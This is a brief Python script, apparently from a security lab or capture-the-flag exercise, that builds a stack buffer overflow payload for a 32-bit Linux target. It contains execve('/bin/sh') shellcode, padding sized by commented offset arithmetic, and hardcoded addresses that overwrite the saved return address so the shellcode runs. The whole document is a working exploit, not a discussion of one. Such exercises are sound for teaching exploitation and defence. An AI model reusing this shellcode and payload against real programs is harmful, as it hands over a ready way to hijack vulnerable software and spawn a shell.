from struct import pack
import sys
shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

# this shellcode is 23 bytes long, and the frame buffer is 0x810 bytes away.
# Our target variable is 0x800 bytes away, because its 0x10 from the frame buffer
# And then finally subtract the 23 bytes away for the shell code gives up 2025
# The first address is the shellcode, and the second is the address of the return address
payload = shellcode + b'\x11' * 2025 + pack("<I", 0xbffee368) + pack("<I", 0xbffeeb7c)
sys.stdout.buffer.write(payload)

